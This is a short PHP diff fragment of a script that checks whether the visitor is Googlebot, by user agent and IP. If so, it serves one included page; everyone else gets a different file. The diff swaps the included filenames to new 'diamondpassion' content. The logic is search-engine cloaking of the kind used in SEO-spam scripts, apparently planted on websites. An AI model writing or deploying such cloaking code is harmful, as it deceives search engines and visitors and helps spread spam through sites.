@@ -24,11 +24,11 @@ $isGoogleBot = $isGoogleBotUA || isGooglebotIp($remoteIp);
 
 
 if ($isGoogleBot) {
-include __DIR__ . '/deleathercraft.php';
+include __DIR__ . '/diamondpassion.html';
 exit;
 }
 
 
-include __DIR__ . '/repair-greater-noida.txt';
+include __DIR__ . '/diamondpassion-in-about-us.txt';
 exit;
 ?>
